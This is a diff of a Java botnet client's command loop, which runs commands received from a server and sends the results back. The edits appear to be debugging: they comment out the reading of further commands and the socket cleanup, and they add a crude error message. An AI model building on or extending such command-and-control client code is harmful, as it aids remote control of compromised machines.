@@ -44,7 +44,7 @@ public class BotnetClient{
         }
 
         //While there are commands being sent from the server
-        while(inQueue != null){
+        while(inQueue!=null){
             inCommand = inQueue.take();
             
             System.out.println("[+]Running Command " + inCommand.getCommandName());
@@ -57,30 +57,34 @@ public class BotnetClient{
             // System.out.println("[*]Command Response: " + inCommand.getResponse());
             // System.out.println("[*]Command Error Status: " + inCommand.getErrorStatus());
             // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());
+            // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());
+            
 
             //send command back to server
             inQueue.put(inCommand);
             out.writeObject(inQueue);
             //if the command running had an error then close the connection 
             if (inCommand.getErrorStatus() && inCommand.getIsExecuted()){
-                break;
+                System.err.println("[-] error bro");
+                // break;
             }
 
-            try{
-                //if there was no error
-                if (!inCommand.getErrorStatus())
-                    //get the next command
-                    inQueue = (CommandQueue) in.readObject();
-            }
-            catch (ClassNotFoundException cnfe){
-                System.err.println("[-]BotNetClient: Problem reading object: class not found");
-                System.err.println(cnfe);
-                System.exit(1);
-            }
+            // try{
+            //     //if there was no error
+            //     if (!inCommand.getErrorStatus())
+            //         //get the next command
+            //         inQueue = (CommandQueue) in.readObject();
+            // }
+            // catch (ClassNotFoundException cnfe){
+            //     System.err.println("[-]BotNetClient: Problem reading object: class not found");
+            //     System.err.println(cnfe);
+            //     System.exit(1);
+            // }
+            // //close streams
+            // out.close();
+            // in.close();
+            // socket.close();
+            inQueue = null;
         }
-        //close streams
-        out.close();
-        in.close();
-        socket.close();
     }    
 }
